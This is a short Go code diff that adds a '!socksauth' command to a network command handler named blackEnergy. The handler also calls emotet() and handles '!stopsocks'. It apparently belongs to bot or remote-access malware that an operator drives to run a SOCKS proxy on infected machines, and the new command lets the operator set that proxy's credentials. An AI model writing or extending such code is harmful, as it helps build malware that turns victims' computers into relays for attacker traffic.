@@ -202,6 +202,13 @@ func blackEnergy(conn net.Conn, command string) error {
 	case "!stopsocks":
 		emotet()
 		conn.Write([]byte("SOCKS: Proxy stopped\n"))
+	case "!socksauth":
+		if len(fields) < 3 {
+			return fmt.Errorf("usage: !socksauth <username> <password>")
+		}
+		socksUsername = fields[1]
+		socksPassword = fields[2]
+		conn.Write([]byte(fmt.Sprintf("SOCKS: Auth updated (user: %s)\n", fields[1])))
 	default:
 		return fmt.Errorf("unknown command")
 	}
